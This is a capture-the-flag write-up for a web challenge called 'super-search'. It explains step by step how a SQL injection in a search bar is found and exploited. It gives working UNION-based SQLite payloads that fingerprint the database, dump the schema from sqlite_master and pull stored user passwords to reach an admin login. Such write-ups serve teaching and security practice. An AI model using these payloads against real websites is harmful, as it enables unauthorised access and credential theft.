# super-search

Opening the Super Search web page, we are greeted by a search bar and a link to an admin login page in the top-right.

You could start by typing random words into the search bar. For example, typing in `game` yields a list of board games, video games and related products each with a description and a category.
Complex queries such as `what is the flag` yield no results at all. Keen contestants will notice that this behaviour resembles a very rudimentary database search, using basic string matching.

Indeed, this suspicion is confirmed when typing in a query with special symbols such as `'` or `?`: `what is the 'flag'` will result in the page throwing an error:
```
Unable to prepare statement: 1, near "flag": syntax error
```
This information is extremely useful: not only are we quite sure that an SQL injection should be possible, but the server also graciously provides us with all the information required in order to reverse-engineer te underlying database.

Let's try figuring out what database is being used, by inserting a second query. An educated guess is made that the database is SQLite, but if it weren't, we'd get an error in the following queries telling us so.

| **Query**                        | **Result**                                                             |
|----------------------------------|------------------------------------------------------------------------|
| foo'; SELECT sqlite_version();-- | Only "Foo Fighters" pops up, which is the same result `foo` would get. |

> note: `'` terminates the match string in the query. `--` indicates a comment in SQLite, allowing us to ignore everything following our injected query.

Perchance, the server does not support multiple statements in one query. Let's try a `UNION` clause instead:

| **Query**                             | **Result**                                                                                                                    |
|---------------------------------------|-------------------------------------------------------------------------------------------------------------------------------|
| foo' UNION SELECT sqlite_version();-- | _Error_: Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns |

This is easy to fix: our results table has 3 columns, thus we prepare our query to return 3 as well.

```
foo' UNION SELECT sqlite_version(), sqlite_version(), sqlite_version();--
```
Yields:

| name         | description                                   | kind       |
|--------------|-----------------------------------------------|------------|
| 3.28.0       | 3.28.0                                        | 3.28.0     |
| Foo Fighters | American rock band, formed in Seattle in 1994 | rock group |

There is now no doubt left that SQL injection is freely possible, and that we are using SQLite.
A contestant will typically proceed by researching how to obtain the database structure using SQLite, or by making `SELECT *` queries on random table names, hoping to get the right one.

The database structure is procured as such:
```
foo' UNION SELECT sql, sql, sql FROM sqlite_master;--
```

Which shows us the `users` table:

```
foo' UNION SELECT * FROM users;--
```

Which gives us access to the `jsmith` and `rvdb` users and their passwords. These combinations can be used in the admin login screen, revealing the challenge flag.